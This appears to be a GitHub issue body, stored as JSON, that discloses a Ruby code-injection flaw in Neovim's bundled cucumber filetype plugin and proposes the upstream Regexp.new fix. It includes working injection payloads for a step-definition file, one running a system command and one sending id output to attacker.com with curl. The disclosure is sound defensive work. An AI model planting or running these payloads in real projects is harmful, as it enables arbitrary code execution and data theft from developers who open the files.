    "author_association": "NONE",
    "body": "# [Security] Neovim affected by GHSA-4473-94jm-w5x9 — cucumber filetype plugin Ruby code injection via crafted step patterns (vim < 9.2.0496)\n\n## Summary\n\nNeovim bundles the cucumber filetype plugin (`runtime/ftplugin/cucumber.vim`) which contains\na `s:stepmatch()` function vulnerable to code injection via crafted step definition patterns.\nThe fix from vim 9.2.0496 (commit `a65a52d684bc58535ad28a4ae824d22e76399934`) has not been\napplied to neovim. Neovim supports Ruby (`:has('ruby')`), making this exploitable.\n\n## Vulnerability Details\n\n- **GHSA**: [GHSA-4473-94jm-w5x9](https://github.com/vim/vim/security/advisories/GHSA-4473-94jm-w5x9)\n- **Upstream fix (vim)**: 9.2.0496 (commit `a65a52d684bc58535ad28a4ae824d22e76399934`, 2026-05-17)\n- **Affected code**: `runtime/ftplugin/cucumber.vim` — `s:stepmatch()`\n- **Vulnerability type**: CWE-94 — Improper Control of Generation of Code (Code Injection)\n\n## Root Cause\n\nIn `s:stepmatch()`, when Vimscript pattern matching fails, the function falls back to Ruby's\n`Kernel.eval()` to evaluate a regex constructed from an attacker-controlled step pattern:\n\n```vim\n\" runtime/ftplugin/cucumber.vim line 99 (neovim HEAD 84d5c5f4b)\nruby VIM.command(\"return #{if (begin; Kernel.eval('/'+VIM.evaluate('pattern')+'/'); rescue SyntaxError; end) === VIM.evaluate('a:target') then 1 else 0 end}\")\n```\n\nThe `pattern` variable is derived from step definition strings in `.rb` files in the project.\nIf a step definition file contains an injection pattern like:\n```\n/) + system('touch /tmp/pwned') + (/\n```\nthen `Kernel.eval('/'+pattern+'/')` executes `system('touch /tmp/pwned')` as arbitrary Ruby.\n\nThe `!~ '\\\\\\@<!#{'` check only guards against Ruby string interpolation `#{...}` and does\nnot prevent regex-literal injection.\n\n### Attack Scenario\n\n1. An attacker places a malicious `.rb` step-definitions file in the project's\n   `features/step_definitions/` directory:\n   ```ruby\n   Given(/\\/) + system('curl http://attacker.com/?$(id)') + (\\// ) do\n   end\n   ```\n2. The victim opens a `.feature` file in neovim (with `+ruby` built) and uses the\n   `[d` or `]d` step-jump mappings that call `s:steps()` → `s:stepmatch()`.\n3. `Kernel.eval` executes the injected Ruby, running `system()` with arbitrary commands.\n\n## Verification\n\nThe vulnerable pattern is confirmed in neovim HEAD (`84d5c5f4b`):\n\n```\n$ grep -n \"Kernel.eval\" runtime/ftplugin/cucumber.vim\n99:    ruby VIM.command(\"return #{if (begin; Kernel.eval('/'+VIM.evaluate('pattern')+'/'); rescue SyntaxError; end) === VIM.evaluate('a:target') then 1 else 0 end}\")\n```\n\nThe vim 9.2.0496 fix (`a65a52d684bc58535ad28a4ae824d22e76399934`) has not been applied:\n\n```\n$ git log --all --oneline | grep -i \"9.2.0496\\|cucumber\\|4473\"\n(no output)\n```\n\n## Suggested Fix\n\nApply the upstream fix from vim 9.2.0496:\n\n```vim\n\" Fixed (vim 9.2.0496):\nruby VIM.command(\"return #{if (begin; Regexp.new(VIM.evaluate('pattern')); rescue RegexpError; end) === VIM.evaluate('a:target') then 1 else 0 end}\")\n```\n\n`Regexp.new(pattern)` creates a regex object from the string without evaluating arbitrary\nRuby code, unlike `Kernel.eval('/'+pattern+'/')`.\n\nOr import the fix as a vim-patch commit:\n- Upstream fix: https://github.com/vim/vim/commit/a65a52d684bc58535ad28a4ae824d22e76399934\n- GHSA: https://github.com/vim/vim/security/advisories/GHSA-4473-94jm-w5x9\n",
